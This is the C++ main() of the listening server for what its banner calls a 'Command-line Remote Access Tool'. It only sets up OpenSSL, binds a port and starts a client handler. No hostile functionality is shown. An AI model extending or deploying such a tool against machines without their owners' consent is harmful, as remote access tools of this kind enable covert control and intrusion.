#include "headers.hpp"
#include "Server.hpp"
#include "Misc.hpp"
bool bSignalFlag;

void CleanEx(int){
	std::cout<<"\nProgram interrupted press enter to exit\n";
	bSignalFlag = true;
}

int main(int argc, char **argv){
	if(argc < 2){
			std::cout<<argv[0]<<" port\n";
			return 0;
	}
    char cBanner[] = {"▄• ▄▌ ▐ ▄  ▐ ▄  ▄▄▄· • ▌ ▄ ·. ▄▄▄ .·▄▄▄▄    ▄▄▄   ▄▄▄· ▄▄▄▄▄\n"\
"█▪██▌•█▌▐█•█▌▐█▐█ ▀█ ·██ ▐███▪▀▄.▀·██· ██   ▀▄ █·▐█ ▀█ •██\n"\
"█▌▐█▌▐█▐▐▌▐█▐▐▌▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▪ ▐█▌  ▐▀▀▄ ▄█▀▀█  ▐█.▪\n"\
"▐█▄█▌██▐█▌██▐█▌▐█▪ ▐▌██ ██▌▐█▌▐█▄▄▌██. ██   ▐█•█▌▐█▪ ▐▌ ▐█▌·\n"\
" ▀▀▀ ▀▀ █▪▀▀ █▪ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀ ▀▀▀▀▀•   .▀  ▀ ▀  ▀  ▀▀▀\n\n"\
"          Command-line Remote Access Tool\n"\
"                 by d3adlym1nd\n"};
    std::cout<<cBanner<<'\n';
	bSignalFlag = false;
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();
	u_int uiLport = Misc::StrToUint(argv[1]);
	Server *srvServer = new Server(uiLport);
	srvServer->NullClients();
	signal(SIGPIPE, SIG_IGN);
	signal(SIGINT, CleanEx);
	if(srvServer->Listen(10)){
			srvServer->thStartHandler();
	}
	delete srvServer;
	srvServer = nullptr;
	return 0;
}
